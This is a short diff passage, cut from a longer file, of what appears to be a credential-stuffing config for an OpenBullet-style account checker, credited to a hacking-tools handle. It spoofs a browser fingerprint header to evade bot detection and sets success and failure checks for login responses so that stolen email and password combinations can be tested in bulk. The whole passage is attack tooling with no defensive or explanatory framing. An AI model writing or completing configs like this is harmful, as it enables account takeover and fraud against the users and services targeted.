lmdqKVg6IxSb3EnI+2wc=" 
+  HEADER "x-grid-b: {\"gCV\":\"Google Inc. (Intel)\",\"gCN\":\"ANGLE (Intel, Intel(R) HD Graphics Direct3D11 vs_5_0 ps_5_0, D3D11-10.18.10.4252)\",\"aB\":\"101.45646868248605\",\"sR\":\"1440, 900\",\"sL\":\"es\",\"sF\":\"27ad0b308d5a51f5345a04ceea3df69b494492ea\",\"sFC\":57,\"sT\":\"GMT-0300 (hora estándar de Uruguay)\"}" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "We didn't find an account with that email address." 
+    KEY "status\":\"failure\"" 
+    KEY "status\":\"expired\"" 
+  KEYCHAIN Success OR 
+    KEY "status\":\"success\"" 
+
+FUNCTION Constant "@hackingtoolsprvi8" -> VAR "Config By" 
+
